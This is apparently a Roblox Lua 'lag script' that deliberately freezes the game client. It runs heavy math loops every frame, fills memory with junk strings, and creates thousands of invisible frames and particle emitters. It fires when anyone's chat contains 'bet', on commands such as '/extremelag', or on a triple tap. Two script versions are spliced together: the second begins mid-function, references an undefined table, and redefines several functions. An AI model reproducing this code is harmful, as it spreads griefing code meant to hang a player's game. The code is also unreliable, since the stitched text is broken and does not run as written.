local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "iOSLagGUI"
screenGui.DisplayOrder = 9999
screenGui.Enabled = true
screenGui.Parent = playerGui

local mainContainer = Instance.new("Frame")
mainContainer.Name = "MainContainer"
mainContainer.Size = UDim2.new(1, 0, 1, 0)
mainContainer.BackgroundTransparency = 1
mainContainer.Visible = true
mainContainer.Active = false
mainContainer.Parent = screenGui

local isActive = false
local lagConnections = {}

local function triggerIOSLag()
    if isActive then return end
    isActive = true
    
    local cpuLagConnection = RunService.Heartbeat:Connect(function()
        local result = 0
        for i = 1, 100000 do
            result = result + math.sin(i) * math.cos(i) / math.tan(i + 1)
            result = result * math.random() * math.random()
            result = result + math.sqrt(i) * math.log(i + 1)
            result = result * math.exp(math.random())
        end
    end)
    table.insert(lagConnections, cpuLagConnection)
    
    local cpuLagConnection2 = RunService.RenderStepped:Connect(function()
        local total = 0
        for x = 1, 200 do
            for y = 1, 200 do
                total = total + math.sqrt(x^3 + y^3) * math.sin(x * y * 0.1)
                total = total * math.cos(total) * math.tan(total)
            end
        end
    end)
    table.insert(lagConnections, cpuLagConnection2)
    
    local overlay = Instance.new("Frame")
    overlay.Name = "LagOverlay"
    overlay.Size = UDim2.new(1, 0, 1, 0)
    overlay.BackgroundColor3 = Color3.new(0, 0, 0)
    overlay.BackgroundTransparency = 0.99
    overlay.Parent = mainContainer
    
    local overlayConnection = RunService.RenderStepped:Connect(function()
        overlay.BackgroundTransparency = 0.95 + math.sin(tick() * 20) * 0.04
        overlay.Size = UDim2.new(1 + math.sin(tick() * 10) * 0.02, 0, 
                                1 + math.cos(tick() * 10) * 0.02, 0)
        overlay.Rotation = math.sin(tick() * 15) * 5
    end)
    table.insert(lagConnections, overlayConnection)
    
    for layer = 1, 5 do
        local extraOverlay = Instance.new("Frame")
        extraOverlay.Size = UDim2.new(1, 0, 1, 0)
        extraOverlay.BackgroundTransparency = 0.995
        extraOverlay.BackgroundColor3 = Color3.new(layer/10, 0, 0)
        extraOverlay.Parent = mainContainer
        
        local extraConnection = RunService.RenderStepped:Connect(function()
            extraOverlay.Position = UDim2.new(
                math.sin(tick() * (layer + 2)) * 0.01, 0,
                math.cos(tick() * (layer + 2)) * 0.01, 0
            )
            extraOverlay.Rotation = math.cos(tick() * (layer + 5)) * 10
        end)
        table.insert(lagConnections, extraConnection)
    end
    
    local inputConnection = RunService.Heartbeat:Connect(function()
        for i = 1, 50 do
            pcall(function()
                local fakeInput = {
                    KeyCode = Enum.KeyCode.A,
                    UserInputType = Enum.UserInputType.Keyboard,
                    UserInputState = Enum.UserInputState.Begin
                }
            end)
        end
    end)
    table.insert(lagConnections, inputConnection)
    
    local memoryArray = {}
    local memoryConnection = RunService.Heartbeat:Connect(function()
        for i = 1, 2000 do
            memoryArray[i] = string.rep("LAG", 2000)
            memoryArray[i + 2000] = string.rep("X", 1000)
            memoryArray[i + 4000] = string.rep("Y", 1500)
        end
        if #memoryArray > 30000 then
            for i = 1, 10000 do
                memoryArray[i] = nil
            end
        end
    end)
    table.insert(lagConnections, memoryConnection)
    
    local renderFrames = {}
    for i = 1, 200 do
        local frame = Instance.new("Frame")
        frame.Size = UDim2.new(0.05, 0, 0.05, 0)
        frame.Position = UDim2.new(math.random(), 0, math.random(), 0)
        frame.BackgroundTransparency = 0.999
        frame.BackgroundColor3 = Color3.new(math.random(), math.random(), math.random())
        frame.Parent = mainContainer
        table.insert(renderFrames, frame)
        
        local frameConnection = RunService.RenderStepped:Connect(function()
            frame.Position = UDim2.new(
                (frame.Position.X.Scale + math.sin(tick() * (i/5)) * 0.02) % 1, 0,
                (frame.Position.Y.Scale + math.cos(tick() * (i/5)) * 0.02) % 1, 0
            )
            frame.Rotation = math.sin(tick() * i * 2) * 720
            frame.Size = UDim2.new(
                0.05 + math.sin(tick() * (i/2)) * 0.1, 0,
                0.05 + math.cos(tick() * (i/2)) * 0.1, 0
            )
        end)
        table.insert(lagConnections, frameConnection)
    end
    
    for particle = 1, 10 do
        local particleFrame = Instance.new("Frame")
        particleFrame.Size = UDim2.new(0.02, 0, 0.02, 0)
        particleFrame.BackgroundTransparency = 0.998
        particleFrame.BackgroundColor3 = Color3.new(1, 0, 0)
        particleFrame.Parent = mainContainer
        
        local particleConnection = RunService.RenderStepped:Connect(function()
            particleFrame.Position = UDim2.new(
                math.sin(tick() * particle * 3) * 0.5 + 0.5, 0,
                math.cos(tick() * particle * 3) * 0.5 + 0.5, 0
            )
        end)
        table.insert(lagConnections, particleConnection)
    end
    
    local networkConnection = RunService.Heartbeat:Connect(function()
        for i = 1, 100 do
            pcall(function()
                local fakeData = {
                    type = "update",
                    data = string.rep("X", 5000),
                    timestamp = tick()
                }
            end)
        end
    end)
    table.insert(lagConnections, networkConnection)
    
    local physicsConnection = RunService.Stepped:Connect(function()
        local total = 0
        for x = 1, 300 do
            for y = 1, 300 do
                for z = 1, 5 do
                    total = total + math.sqrt(x^2 + y^2 + z^2) * math.sin(x * y * z * 0.05)
                    total = total * math.cos(total) * math.exp(math.random())
                end
            end
        end
    end)
    table.insert(lagConnections, physicsConnection)
    
    local gcConnection = RunService.Heartbeat:Connect(function()
        for i = 1, 500 do
            local tempTable = {}
            for j = 1, 200 do
                tempTable[j] = string.rep("G", 500)
                tempTable[j + 200] = string.rep("H", 500)
            end
        end
    end)
    table.insert(lagConnections, gcConnection)
    
    local stringConnection = RunService.Heartbeat:Connect(function()
        local bigString = ""
        for i = 1, 1000 do
            bigString = bigString .. string.rep("LAG", 100)
            if #bigString > 100000 then
                bigString = ""
            end
        end
    end)
    table.insert(lagConnections, stringConnection)
    
    local tableConnection = RunService.Heartbeat:Connect(function()
        local megaTable = {}
        for i = 1, 1000 do
            megaTable[i] = {}
            for j = 1, 100 do
                megaTable[i][j] = math.random() * math.random() * math.random()
                megaTable[i][j + 100] = string.rep("Z", 200)
            end
        end
    end)
    table.insert(lagConnections, tableConnection)
    
    task.delay(20, function()
        if isActive then
            clearLag()
        end
    end)
end

local function clearLag()
    if not isActive then return end
    isActive = false
    
    for _, conn in pairs(lagConnections) do
        pcall(function() conn:Disconnect() end)
    end
    lagConnections = {}
    
    for _, child in pairs(mainContainer:GetChildren()) do
        pcall(function() child:Destroy() end)
    end
    
    task.wait(0.5)
    for i = 1, 5 do
        collectgarbage()
        task.wait(0.1)
    end
end

local function setupChatDetection()
    local function monitorPlayer(player)
        player.Chatted:Connect(function(message)
            local text = string.lower(message)
            if string.find(text, "bet") and not isActive then
                task.wait(0.5)
                triggerIOSLag()
            end
        end)
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        monitorPlayer(player)
    end
    
    Players.PlayerAdded:Connect(monitorPlayer)
    
    pcall(function()
        local TextChatService = game:GetService("TextChatService")
        if TextChatService then
            local channels = TextChatService:FindFirstChild("TextChannels")
            if channels then
                for _, channel in pairs(channels:GetChildren()) do
                    if channel:IsA("TextChannel") then
                        channel.OnMessageReceived:Connect(function(message)
                            local text = string.lower(message.Text)
                            if string.find(text, "bet") and not isActive then
                                task.wait(0.5)
                                triggerIOSLag()
                            end
                        end)
                    end
                end
            end
        end
    end)
end

local function setupConsole()
    player.Chatted:Connect(function(message)
        local cmd = string.lower(message)
        if cmd == "/freeze" and not isActive then
            triggerIOSLag()
        elseif cmd == "/unfreeze" then
            clearLag()
        elseif cmd == "/lag" and not isActive then
            triggerIOSLag()
        end
    end)
end

setupChatDetection()
setupConsole()

if UserInputService.TouchEnabled then
    local touchCount = 0
    local lastTouchTime = 0
    
    UserInputService.TouchStarted:Connect(function()
        local currentTime = tick()
        if currentTime - lastTouchTime < 0.2 then
            touchCount = touchCount + 1
            if touchCount >= 3 and not isActive then
                triggerIOSLag()
                touchCount = 0
            end
        else
            touchCount = 1
        end
        lastTouchTime = currentTime
    end)
end                local extraLabel = Instance.new("TextLabel")
                extraLabel.Size = UDim2.new(0.5, 0, 0.5, 0)
                extraLabel.Position = UDim2.new(math.random(), 0, math.random(), 0)
                extraLabel.Text = string.rep("L", math.random(100, 500))
                extraLabel.TextTransparency = 1
                extraLabel.BackgroundTransparency = 1
                extraLabel.Visible = true
                extraLabel.Active = false
                extraLabel.Parent = childFrame
            end
        end
        
        frame.Parent = mainContainer
        table.insert(createdFrames, frame)
        
        if i % 100 == 0 then
            local extraFrame = Instance.new("Frame")
            extraFrame.Size = UDim2.new(0, 500, 0, 500)
            extraFrame.Position = UDim2.new(math.random(), 0, math.random(), 0)
            extraFrame.BackgroundTransparency = 1
            extraFrame.Visible = true
            extraFrame.Active = false
            
            for r = 1, 10 do
                local recursiveFrame = Instance.new("Frame")
                recursiveFrame.Size = UDim2.new(1, 0, 1, 0)
                recursiveFrame.BackgroundTransparency = 1
                recursiveFrame.Visible = true
                recursiveFrame.Active = false
                recursiveFrame.Parent = extraFrame
                
                for s = 1, 5 do
                    local deepFrame = Instance.new("Frame")
                    deepFrame.Size = UDim2.new(0.2, 0, 0.2, 0)
                    deepFrame.Position = UDim2.new(s * 0.2, 0, 0, 0)
                    deepFrame.BackgroundTransparency = 1
                    deepFrame.Visible = true
                    deepFrame.Active = false
                    deepFrame.Parent = recursiveFrame
                end
            end
            
            extraFrame.Parent = mainContainer
            table.insert(createdFrames, extraFrame)
        end
    end
    
    local scrollingFrame = Instance.new("ScrollingFrame")
    scrollingFrame.Name = "ExtremeScroller"
    scrollingFrame.Size = UDim2.new(3, 0, 3, 0)
    scrollingFrame.Position = UDim2.new(-1, 0, -1, 0)
    scrollingFrame.BackgroundTransparency = 1
    scrollingFrame.ScrollingEnabled = true
    scrollingFrame.CanvasSize = UDim2.new(0, 0, 1000, 0)
    scrollingFrame.ScrollBarThickness = 0
    scrollingFrame.Visible = true
    scrollingFrame.Active = false
    scrollingFrame.Parent = mainContainer
    
    for i = 1, 2500 do
        local item = Instance.new("Frame")
        item.Size = UDim2.new(1, -10, 0, 15)
        item.Position = UDim2.new(0, 5, 0, i * 20)
        item.BackgroundTransparency = 1
        item.Visible = true
        item.Active = false
        
        for l = 1, 5 do
            local layer = Instance.new("Frame")
            layer.Size = UDim2.new(1, 0, 1, 0)
            layer.BackgroundTransparency = 1
            layer.Visible = true
            layer.Active = false
            layer.Parent = item
            
            local text = Instance.new("TextLabel")
            text.Size = UDim2.new(1, 0, 1, 0)
            text.Text = string.rep("LAG", math.random(10, 50))
            text.TextTransparency = 1
            text.TextWrapped = true
            text.BackgroundTransparency = 1
            text.Visible = true
            text.Active = false
            text.Parent = layer
        end
        
        item.Parent = scrollingFrame
        table.insert(createdFrames, item)
    end
    
    local conn1 = RunService.RenderStepped:Connect(function()
        for i, frame in pairs(createdFrames) do
            if i % 50 == 0 then
                frame.Position = UDim2.new(
                    math.random(), math.random(-1000, 1000),
                    math.random(), math.random(-1000, 1000)
                )
                
                if i % 200 == 0 then
                    frame.Size = UDim2.new(0, math.random(50, 500), 0, math.random(50, 500))
                end
            end
        end
    end)
    
    table.insert(lagConnections, conn1)
    
    local conn2 = RunService.Heartbeat:Connect(function()
        for i = 1, 10 do
            local tempFrame = Instance.new("Frame")
            tempFrame.Size = UDim2.new(0, 100, 0, 100)
            tempFrame.Position = UDim2.new(math.random(), 0, math.random(), 0)
            tempFrame.BackgroundTransparency = 1
            tempFrame.Visible = true
            tempFrame.Active = false
            tempFrame.Parent = mainContainer
            
            task.delay(0.1, function()
                pcall(function() tempFrame:Destroy() end)
            end)
        end
    end)
    
    table.insert(lagConnections, conn2)
    
    for i = 1, 5 do
        local particleEmitter = Instance.new("ParticleEmitter")
        particleEmitter.Enabled = true
        particleEmitter.Texture = ""
        particleEmitter.Transparency = NumberSequence.new(1)
        particleEmitter.Rate = 5000
        particleEmitter.Lifetime = NumberRange.new(0.1, 2)
        particleEmitter.Speed = NumberRange.new(1, 100)
        particleEmitter.Size = NumberSequence.new(NumberRange.new(1, 100))
        particleEmitter.SpreadAngle = Vector2.new(360, 360)
        particleEmitter.Parent = mainContainer
        table.insert(createdFrames, particleEmitter)
    end
    
    print("[EXTREME LAG COMPLETE] Game should be FROZEN!")
    print("GUI is positioned OFF-SCREEN (can't click)")
end

local function clearLag()
    if not isActive then return end
    isActive = false
    
    print("[CLEARING LAG] This might take a moment...")
    
    for _, conn in pairs(lagConnections) do
        pcall(function() conn:Disconnect() end)
    end
    lagConnections = {}
    
    local function destroyChunk(start, chunkSize)
        local endIndex = math.min(start + chunkSize - 1, #createdFrames)
        for i = start, endIndex do
            local obj = createdFrames[i]
            if obj and obj.Parent then
                pcall(function() obj:Destroy() end)
            end
        end
        return endIndex + 1
    end
    
    local chunkSize = 200
    local currentIndex = 1
    local total = #createdFrames
    
    while currentIndex <= total do
        currentIndex = destroyChunk(currentIndex, chunkSize)
        RunService.RenderStepped:Wait()
    end
    
    createdFrames = {}
    
    for _, child in pairs(mainContainer:GetChildren()) do
        pcall(function() child:Destroy() end)
    end
    
    print("[LAG CLEARED] Game should run normally")
end

local function setupChatDetection()
    local function monitorPlayer(player)
        player.Chatted:Connect(function(message)
            local text = string.lower(message)
            if string.find(text, "bet") and not isActive then
                task.wait(0.5)
                triggerExtremeLag()
            end
        end)
    end
    
    for _, player in pairs(Players:GetPlayers()) do
        monitorPlayer(player)
    end
    
    Players.PlayerAdded:Connect(monitorPlayer)
end

local function setupConsole()
    player.Chatted:Connect(function(message)
        if string.lower(message) == "/extremelag" and not isActive then
            triggerExtremeLag()
        elseif string.lower(message) == "/stoplag" then
            clearLag()
        elseif string.lower(message) == "/laginfo" then
            print("=== LAG INFO ===")
            print("Active: " .. tostring(isActive))
            print("Frames created: " .. #createdFrames)
            print("Connections: " .. #lagConnections)
        end
    end)
end

setupChatDetection()
setupConsole()

game:GetService("CoreGui").DescendantRemoving:Connect(function()
    if not screenGui.Parent then
        clearLag()
    end
end)

print("=== EXTREME LAG SCRIPT LOADED ===")
print("Type 'bet' in chat to trigger EXTREME LAG")
print("GUI is positioned OFF-SCREEN (can't click)")
print("")
print("Commands:")
print("/extremelag - Manually trigger extreme lag")
print("/stoplag - Clear all lag")
print("/laginfo - Show lag status")
print("")
print("Warning: This will FREEZE your game!")
